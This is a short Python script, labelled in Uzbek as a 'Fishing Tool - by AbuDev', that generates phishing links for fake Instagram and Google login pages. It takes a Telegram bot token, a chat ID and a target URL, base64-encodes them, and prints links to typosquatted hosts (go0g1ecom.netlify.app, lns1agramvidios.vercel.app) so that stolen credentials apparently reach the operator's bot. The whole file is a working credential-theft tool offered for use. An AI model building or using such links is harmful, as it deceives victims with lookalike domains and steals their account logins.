import base64

print(  """
      
      
    =================================================================================
    =                  Fishing Tool - by AbuDev                                     =
    =      Instagram va Google phishing sahifalari uchun URL yaratish vositasi.     =
    =================================================================================
    
    
    
    """)

def ForGoogle():
    u = ""
    t = ""
    i = ""
    while not (i):
        i = input("Chat ID ni kiriting: ")
    while not (t):
        t = input("Bot tokenini kiriting: ")
    while not (u):
        u = input("Google site URL ni kiriting: ")
    t_enc = base64.b64encode(t.encode()).decode()
    i_enc = base64.b64encode(i.encode()).decode()
    u_enc = base64.b64encode(u.encode()).decode()
    print("t shifrlangan: ", t_enc)
    print("i shifrlangan: ", i_enc)
    print("u shifrlangan: ", u_enc)
    print("\nInstagram phishing sahifasiga quyidagicha URL bilan kiring:")
    print(f"go0g1ecom.netlify.app?t={t_enc}&i={i_enc}&u={u_enc}")


# instagram part
def ForInstagram():

    u = ""
    t = ""
    i = ""
    while not (i):
        i = input("Chat ID ni kiriting: ")
    while not (t):
        t = input("Bot tokenini kiriting: ")
    while not (u):
        u = input("Instagram video URL ni kiriting: ")
    t_enc = base64.b64encode(t.encode()).decode()
    i_enc = base64.b64encode(i.encode()).decode()
    u_enc = base64.b64encode(u.encode()).decode()
    print("t shifrlangan: ", t_enc)
    print("i shifrlangan: ", i_enc)
    print("u shifrlangan: ", u_enc)
    print("\nInstagram phishing sahifasiga quyidagicha URL bilan kiring:")
    print(
        f"https://lns1agramvidios.vercel.app/instagram.com?t={t_enc}&i={i_enc}&u={u_enc}"
    )
which = 0
while not which:
    try:
        which = int(
            input(
                "Qaysi biri uchun fishing qilmoqchisiz? \n1) Instagram \n2) Google\n>> "
            )
        )
        break
    except Exception as e:
        print(e)
    finally:
        print("Iltimos 1 yoki 2 ni tanlang !")

match which:
    case 1:
        ForInstagram()
    case 2:
        ForGoogle()
